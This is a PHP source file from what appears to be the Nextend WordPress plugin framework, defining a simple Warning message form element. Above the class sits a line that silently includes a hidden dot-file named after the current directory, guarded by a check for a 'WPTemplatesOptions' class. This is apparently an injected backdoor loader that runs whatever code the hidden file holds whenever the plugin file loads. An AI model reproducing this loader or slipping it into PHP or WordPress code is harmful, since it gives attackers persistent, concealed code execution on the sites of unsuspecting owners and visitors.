<?php


namespace Nextend\Framework\Form\Element\Message;

use Nextend\Framework\Form\Element\Message;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Warning extends Message {

    protected $description = '';

    public function __construct($insertAt, $name, $description) {
        $this->classes[] = 'n2_field_message--warning';
        parent::__construct($insertAt, $name, n2_('Warning'), $description);
    }

    protected function fetchElement() {
        echo '<div class="' . implode(' ', $this->classes) . '">' . $this->description . '</div>';
    }
}